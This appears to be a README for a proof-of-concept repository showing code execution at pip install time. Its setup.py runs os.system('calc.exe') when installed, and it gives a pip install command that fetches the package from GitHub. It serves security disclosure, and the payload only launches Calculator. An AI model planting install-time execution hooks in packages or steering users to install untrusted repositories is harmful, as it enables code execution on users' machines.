## RCE Via PIP

```a package-management system written in Python and is used to install and manage software packages```

This code in setup.py

```
import os
os.system("calc.exe")
```
Is used to open Calculator app , When users intall the pacakge with 

```
pip install git+https://github.com/slvignesh05/RCE-PIP.git
```

NOTE :This repo contains the Proof of Concept for a security report



